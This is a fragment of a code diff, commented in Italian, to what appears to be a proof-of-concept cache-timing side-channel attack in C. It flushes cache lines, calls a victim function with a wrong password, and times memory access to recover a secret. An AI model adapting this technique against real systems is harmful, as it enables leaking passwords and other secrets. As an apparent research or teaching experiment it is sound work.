@@ -111,15 +111,11 @@ int main(int argn, char *argv[]) {
 					_mm_clflush(&passwordDigest[i]);
 				}
 
-				for (volatile int z = 0; z < 100; z++) {
-				}
+				_mm_lfence();
 
 				// richiamo la funzione vittima con l'ID da attaccare
 				// e la password sbagliata
 				victim_function(userUnderAttack, wrongPassword);
-
-				for (volatile int z = 0; z < 100; z++) {
-				}
 
 				// calcolo il tempo di accesso alla posizione l
 				time1 = __rdtscp(&timeReg);
@@ -150,11 +146,11 @@ int main(int argn, char *argv[]) {
 		// con il piu alto numero di occorrenze e lo confronto con il segreto
 		// assicurandomi che ci sia almeno una occorrenza
 		int rangeMax =
-				((index + 1) * delta + (precisionLoss * delta) >= SIZE) ?
-						SIZE : (index + 1) * delta + (precisionLoss * delta);
+				((index + 1 + precisionLoss) * delta >= SIZE) ?
+						SIZE : (index + 1 + precisionLoss) * delta;
 		int rangeMin =
-				((index - 1) * delta - (precisionLoss * delta) <= 0) ?
-						0 : (index - 1) * delta - (precisionLoss * delta);
+				((index - 1 + precisionLoss) * delta <= 0) ?
+						0 : (index - 1 + precisionLoss) * delta;
 
 		if (results[index] > 0 && rangeMin <= secret[userUnderAttack]
 				&& rangeMax >= secret[userUnderAttack]) {
